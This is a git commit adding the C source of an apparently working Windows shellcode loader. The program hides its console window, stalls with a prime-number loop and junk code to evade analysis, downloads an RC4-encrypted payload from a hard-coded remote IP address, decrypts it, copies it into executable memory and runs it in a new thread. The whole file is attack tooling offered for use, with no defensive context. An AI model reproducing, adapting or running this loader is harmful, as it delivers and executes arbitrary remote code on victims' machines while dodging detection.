486765d89453d0e66184c85c194f43b21be4a37a
K0ng <156843472+1K0ng@users.noreply.github.com>
2024-06-11 14:35:10 +0800

    Add files via upload

---
+++ ShellCodeLoader/Source.c
@@ -0,0 +1,231 @@
+#include <windows.h>
+#include <winhttp.h>
+#include <stdio.h>
+#include <string.h>
+#include <math.h>
+
+#pragma comment(lib, "winhttp.lib")
+
+// RC4 encryption function (obfuscated)
+void obfuscated_encrypt(unsigned char* data, size_t data_len, unsigned char* key);
+
+// RC4 decryption function (obfuscated)
+void obfuscated_decrypt(unsigned char* data, size_t data_len, unsigned char* key);
+
+// Function to hide window (obfuscated)
+void obfuscate_window() {
+    HWND hwnd = GetForegroundWindow();
+    if (hwnd) {
+        ShowWindow(hwnd, SW_HIDE);
+    }
+}
+
+// Useless function
+void useless_function() {
+    int x = rand() % 10;
+    if (x > 10) {
+        printf("Useless branch\n");
+    }
+    else if (x < 0) {
+        printf("Another useless branch\n");
+    }
+    else {
+        // Do nothing
+    }
+}
+
+// Prime enumeration function to delay execution
+void delay_execution() {
+    for (int i = 2; i <= 2000000; ++i) {
+        int isPrime = 1; // Use int instead of bool
+        for (int j = 2; j <= sqrt(i); ++j) {
+            if (i % j == 0) {
+                isPrime = 0; // Use 0 for false
+                break;
+            }
+        }
+    }
+}
+
+// Function to download payload from remote server using WinHTTP
+unsigned char* download_payload(const wchar_t* url, size_t* payload_size) {
+    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    unsigned char* payload = NULL;
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer;
+    BOOL  bResults = FALSE;
+
+    URL_COMPONENTS urlComp;
+    ZeroMemory(&urlComp, sizeof(urlComp));
+    urlComp.dwStructSize = sizeof(urlComp);
+
+    wchar_t hostName[256];
+    wchar_t urlPath[256];
+
+    urlComp.lpszHostName = hostName;
+    urlComp.dwHostNameLength = sizeof(hostName) / sizeof(wchar_t);
+    urlComp.lpszUrlPath = urlPath;
+    urlComp.dwUrlPathLength = sizeof(urlPath) / sizeof(wchar_t);
+
+    if (!WinHttpCrackUrl(url, 0, 0, &urlComp)) {
+        fprintf(stderr, "WinHttpCrackUrl failed\n");
+        return NULL;
+    }
+
+    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+        fprintf(stderr, "WinHttpOpen failed\n");
+        return NULL;
+    }
+
+    hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
+    if (!hConnect) {
+        fprintf(stderr, "WinHttpConnect failed\n");
+        WinHttpCloseHandle(hSession);
+        return NULL;
+    }
+
+    hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
+    if (!hRequest) {
+        fprintf(stderr, "WinHttpOpenRequest failed\n");
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return NULL;
+    }
+
+    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    if (!bResults) {
+        fprintf(stderr, "WinHttpSendRequest failed\n");
+    }
+
+    bResults = WinHttpReceiveResponse(hRequest, NULL);
+    if (!bResults) {
+        fprintf(stderr, "WinHttpReceiveResponse failed\n");
+    }
+
+    if (bResults) {
+        do {
+            dwSize = 0;
+            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
+                fprintf(stderr, "Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
+            }
+
+            pszOutBuffer = (LPSTR)malloc(dwSize + 1);
+            if (!pszOutBuffer) {
+                fprintf(stderr, "Out of memory\n");
+                dwSize = 0;
+            }
+            else {
+                ZeroMemory(pszOutBuffer, dwSize + 1);
+                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
+                    fprintf(stderr, "Error %u in WinHttpReadData.\n", GetLastError());
+                }
+                else {
+                    payload = (unsigned char*)realloc(payload, *payload_size + dwDownloaded);
+                    memcpy(payload + *payload_size, pszOutBuffer, dwDownloaded);
+                    *payload_size += dwDownloaded;
+                }
+                free(pszOutBuffer);
+            }
+        } while (dwSize > 0);
+    }
+
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+
+    return payload;
+}
+
+int main(int argc, char* argv[]) {
+    // Hide the window
+    obfuscate_window();
+
+    //Delay execution by enumerating primes
+    delay_execution();
+
+    // Useless function call
+    useless_function();
+
+    // URL of the remote payload
+    const wchar_t* url = L"http://43.139.62.116:8007/1.txt";
+    size_t payload_size = 0;
+    unsigned char* obfuscated_payload = download_payload(url, &payload_size);
+
+    if (!obfuscated_payload) {
+        fprintf(stderr, "Failed to download payload\n");
+        return 1;
+    }
+
+    // Decryption key (example: 16 bytes key)
+    unsigned char key[] = "thisIsA16ByteKey";  // Replace with your key
+
+    // Decrypt payload
+    obfuscated_decrypt(obfuscated_payload, payload_size, key);
+
+    // Allocate memory with execute permission
+    PVOID pAddress = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (pAddress == NULL) {
+        fprintf(stderr, "VirtualAlloc failed, error code: %lu\n", GetLastError());
+        free(obfuscated_payload);
+        return 1;
+    }
+
+    // Copy decrypted payload to allocated memory
+    memcpy(pAddress, obfuscated_payload, payload_size);
+
+    // Create a thread to execute the payload
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0, NULL);
+    if (hThread == NULL) {
+        fprintf(stderr, "CreateThread failed, error code: %lu\n", GetLastError());
+        free(obfuscated_payload);
+        return 1;
+    }
+
+    // Wait for the thread to finish execution
+    WaitForSingleObject(hThread, INFINITE);
+
+    // Cleanup
+    CloseHandle(hThread);
+    free(obfuscated_payload);
+    return 0;
+}
+
+// Obfuscated RC4 encryption function implementation
+void obfuscated_encrypt(unsigned char* data, size_t data_len, unsigned char* key) {
+    int i = 0, j = 0;
+    unsigned char S[256];
+    unsigned char T[256];
+
+    // Key-scheduling algorithm (KSA)
+    for (i = 0; i < 256; i++) {
+        S[i] = i;
+        T[i] = key[i % strlen((char*)key)];
+    }
+
+    for (i = 0, j = 0; i < 256; i++) {
+        j = (j + S[i] + T[i]) % 256;
+        unsigned char temp = S[i];
+        S[i] = S[j];
+        S[j] = temp;
+    }
+
+    // Pseudo-random generation algorithm (PRGA) & encryption
+    i = j = 0;
+    for (size_t n = 0; n < data_len; n++) {
+        i = (i + 1) % 256;
+        j = (j + S[i]) % 256;
+        unsigned char temp = S[i];
+        S[i] = S[j];
+        S[j] = temp;
+        unsigned char k = S[(S[i] + S[j]) % 256];
+        data[n] ^= k;
+    }
+}
+
+// Obfuscated RC4 decryption function implementation
+void obfuscated_decrypt(unsigned char* data, size_t data_len, unsigned char* key) {
+    // Encryption and decryption in RC4 is the same operation
+    obfuscated_encrypt(data, data_len, key);
+}
